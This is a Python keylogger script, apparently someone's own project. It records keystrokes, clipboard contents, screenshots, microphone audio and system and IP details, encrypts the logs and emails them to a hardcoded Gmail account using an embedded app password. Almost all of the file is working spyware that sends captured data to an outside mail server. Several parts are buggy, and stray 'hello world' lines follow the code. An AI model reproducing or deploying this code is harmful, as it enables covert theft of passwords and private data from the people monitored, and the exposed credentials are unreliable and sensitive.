# libraries

# email libraries
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import socket
import platform
import win32clipboard
from pynput.keyboard import Key, Listener

import time
import os
# sound record
from scipy.io.wavfile import write
import sounddevice as sd

# encrypt files
from cryptography.fernet import Fernet
# git
import getpass
from requests import get
# take screenshots
from multiprocessing import Process, freeze_support
from PIL import ImageGrab

keys_info = "key_log.txt"
clip_inf = "clip.txt"
sys_info = "sys.txt"
aud_inf = "audio.wav"
screenshot_inf = "screenshot.png"
microphone_time=10
time_iter=15
num_of_iter_end=3
file_path = "C:\\Users\\Darshi\\PycharmProjects\\Keylogger"
extend = "\\"
email_address = "marshallbing65@gmail.com"
password = "bcfbnimxpcifnkge"
username=getpass.getuser()
toaddr = "marshallbing65@gmail.com"
keys_info_encrypt="e_key_log.txt"
sys_info_encrypt="e_sys.txt"
clip_inf_encrypt="e_clip.txt"
file_merge=file_path+extend
key="rU1eU6LfXqoIfxBudSo7uI_N2Wxd_UL6KnSdDm2hAkA="


def send_mail(filename, attachment, toaddr):
    fromaddr = email_address
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Log File"
    body = "Body_of_the_email"
    msg.attach(MIMEText(body, 'plain'))
    filename = filename
    attachment = open(attachment, 'rb')
    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment;filename=%s" % filename)
    msg.attach(p)
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromaddr, password)
    text = msg.as_string()
    s.sendmail(fromaddr, toaddr, text)
    s.quit()


send_mail(keys_info, file_path + extend + keys_info, toaddr)


def comp_info():
    with open(file_path + extend + sys_info, "a") as f:
        hostname = socket.gethostname()
        IPaddr = socket.gethostbyname(hostname)
        try:
            pub_ip = get("https://api.ipfy.org").text
            f.write("Public IP address: " + pub_ip)
        except Exception:
            f.write("Could not find IP Address")
        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System" + platform.system() + " " + platform.version() + '\n')
        f.write("Machine:" + platform.machine() + "\n")
        f.write("Host Name:" + hostname + "\n")
        f.write("Private IP  Address is" + IPaddr + "\n")


comp_info()


def copy_clip():
    with open(file_path + extend + clip_inf, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write("Clip board data:\n" + pasted_data)
        except:
            f.write("Clipboard Data Not Found")


copy_clip()


def microphone():
    fs = 44100
    tim = 10
    myrecording = sd.rec(int(tim * fs), samplerate=fs, channels=2)
    sd.wait()
    write(file_path + aud_inf, fs, myrecording)





def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_inf)


screenshot()
nu_of_itr=0
currentTime=time.time()
stoppingTime=time.time()+time_iter
while nu_of_itr<num_of_iter_end:
    count = 0
    keys = []


    def on_press(key):
        global keys, count,currentTime
        print(key)
        keys.append(key)
        count += 1
        currentTime=time.time()
        if count >= 1:
            count = 0
            write_file(keys)
            keys = []


    def write_file(keys):
        with open(file_path + extend + keys_info, 'a') as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("Key.space") > 0:
                    f.write('\n')
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)


    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime>stoppingTime:
            return False


    with Listener(on_press=on_press, on_release=on_release) as Listener:
        Listener.join()
    if currentTime>stoppingTime:
        with open(file_path+extend+keys_info,"w")as f:
            f.write(" ")
        screenshot()
        send_mail(screenshot_inf,file_path+extend+screenshot_inf,toaddr)
        copy_clip()
        nu_of_itr+=1
        currentTime=time.time()
        stoppingTime=time.time()+time_iter
#encryption
files_to_encrypt=[file_merge+sys_info,file_merge+clip_inf,file_merge+keys_info]
enc=[file_merge+sys_info_encrypt,file_merge+clip_inf,file_merge+keys_info_encrypt]

flag=0

for i in files_to_encrypt:
     with open(i[flag],'rb')as f:
         data=f.read()
     fernet=Fernet(key)
     encrypted=fernet.encrypt(data)
     with open(enc[flag],'wb') as f:
         f.write(encrypted)
     send_mail(enc[flag],enc[flag],toaddr)
     flag+=1
time.sleep(120)

hello world
it is mandatory
hello world

# email functionalities
